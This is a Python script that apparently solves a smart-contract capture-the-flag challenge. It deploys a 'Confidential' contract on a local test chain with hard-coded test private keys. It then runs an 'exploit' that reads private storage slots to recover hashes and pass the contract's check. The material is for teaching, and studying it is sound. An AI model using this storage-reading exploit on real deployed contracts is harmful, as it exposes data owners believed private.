from ape import accounts, project, chain


w3 = chain.provider.web3

alice_private_key = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
bob_private_key = "0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6"


def set_up():
    print("\n--- Setting up scenario ---\n")

    # set accounts
    deployer = accounts.test_accounts[0]

    # deploy challenge contract
    print("\n--- Deploying challenge contract ---\n")
    confidential = project.Confidential.deploy(
        alice_private_key, bob_private_key, sender=deployer
    )

    # assert correct state of contract
    print("\n--- Ensuring the contract has the correct initial state ---\n")
    assert confidential.firstUser() == "ALICE"
    assert confidential.alice_age() == 24
    assert w3.eth.get_storage_at(confidential.address, 2).hex() == alice_private_key
    assert confidential.ALICE_DATA().decode(encoding="utf-8")[:8] == "QWxpY2UK"

    assert confidential.secondUser() == "BOB"
    assert confidential.bob_age() == 21
    assert w3.eth.get_storage_at(confidential.address, 7).hex() == bob_private_key
    assert confidential.BOB_DATA().decode(encoding="utf-8")[:6] == "Qm9iCg"

    return confidential


def main():
    confidential = set_up()

    print("\n--- Running exploit... ---\n")
    alice_hash = w3.eth.get_storage_at(confidential.address, 4).hex()
    bob_hash = w3.eth.get_storage_at(confidential.address, 9).hex()

    _hash = confidential.hash(alice_hash, bob_hash).hex()

    assert confidential.checkthehash(_hash)

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
